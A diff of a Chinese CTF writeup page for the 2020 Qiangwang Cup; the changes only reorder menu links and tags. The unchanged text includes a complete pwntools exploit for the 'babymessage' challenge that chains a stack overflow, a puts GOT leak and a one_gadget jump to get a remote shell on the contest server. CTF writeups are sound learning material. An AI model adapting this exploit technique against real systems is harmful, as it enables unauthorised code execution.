@@ -101,13 +101,6 @@
 
                         
                         <li>
-                            <a href="/archive/">ARCHIVES</a>
-                        </li>
-                        
-                    
-
-                        
-                        <li>
                             <a href="/about/">ABOUT</a>
                         </li>
                         
@@ -116,6 +109,13 @@
                         
                         <li>
                             <a href="/animal-farm/">Animal Farm</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">ARCHIVES</a>
                         </li>
                         
                     
@@ -183,11 +183,11 @@
                 <div class="post-heading">
                     <div class="tags">
                         
-                          <a class="tag" href="/tags/#Writeups" title="Writeups">Writeups</a>
+                          <a class="tag" href="/tags/#信息安全" title="信息安全">信息安全</a>
                         
                           <a class="tag" href="/tags/#CTF" title="CTF">CTF</a>
                         
-                          <a class="tag" href="/tags/#信息安全" title="信息安全">信息安全</a>
+                          <a class="tag" href="/tags/#Writeups" title="Writeups">Writeups</a>
                         
                     </div>
                     <h1>2020 第四届强网杯解题报告（writeup）</h1>
@@ -240,7 +240,7 @@
 <p>最后返回到 <code>leave_message</code> 函数再触发一次栈溢出，把返回地址改到 one_gadget 就搞定了。</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#p = process('./babymessage')</span></div><div class="line">p = remote(<span class="string">'123.56.170.202'</span>,<span class="string">'21342'</span>)</div><div class="line">e = ELF(<span class="string">'./babymessage'</span>)</div><div class="line"></div><div class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</div><div class="line">puts_got = e.got[<span class="string">'puts'</span>]</div><div class="line">poprdi = <span class="number">0x400ac3</span></div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line"></div><div class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</div><div class="line">p.sendlineafter(<span class="string">'name: '</span>, <span class="string">'\xff'</span>*<span class="number">4</span>)</div><div class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</div><div class="line">p.sendlineafter(<span class="string">'message: '</span>, <span class="string">'\xff'</span>*<span class="number">8</span>+p64(<span class="number">0x6010d4</span>))</div><div class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</div><div class="line">payload = <span class="string">'deadbeefdeadbeef'</span></div><div class="line">payload += p64(poprdi) + p64(puts_got) + p64(puts_plt)</div><div class="line">payload += p64(poprdi) + p64(<span class="number">41</span>)</div><div class="line">payload += p64(<span class="number">0x40080a</span>) + <span class="string">'\x00'</span></div><div class="line">p.sendlineafter(<span class="string">'message: '</span>, payload)</div><div class="line">p.recvuntil(<span class="string">'done!\n'</span>)</div><div class="line">p.recv(<span class="number">1</span>)</div><div class="line"></div><div class="line">puts_addr = p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</div><div class="line">puts_addr = u64(puts_addr)</div><div class="line">print(<span class="string">'puts:'</span>+hex(puts_addr))</div><div class="line"></div><div class="line"><span class="comment">#one_shot = puts_addr - 0x3166e</span></div><div class="line">one_shot = puts_addr + <span class="number">0x89a2c</span></div><div class="line"></div><div class="line">print(<span class="string">'one_shot:'</span>+hex(one_shot))</div><div class="line">p.sendlineafter(<span class="string">'message: '</span>, <span class="string">'deadbeefdeadbeef'</span>+p64(one_shot)+<span class="string">'\x00'</span>)</div><div class="line">p.recvuntil(<span class="string">'done!\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-<h3 id="x2.-reverse---xx_warmup_obf">0x2. Reverse - xx_warmup_obf</h3>
+<h3 id="x2.-reverse---xx_warmup_obf---103pt">0x2. Reverse - xx_warmup_obf - 103pt</h3>
 <p>控制流平坦化，没有什么好说的，就是跑起来硬跟。</p>
 <p>注册了一个 signal handler，程序中间会通过 <code>int 3</code> 中断进入 handler 里，改变决定着控制流的状态变量中存储的常数。</p>
 <p>一直跟下去，到输入完 flag 后面，这里检验 flag 长度为 1Ch（28）：</p>
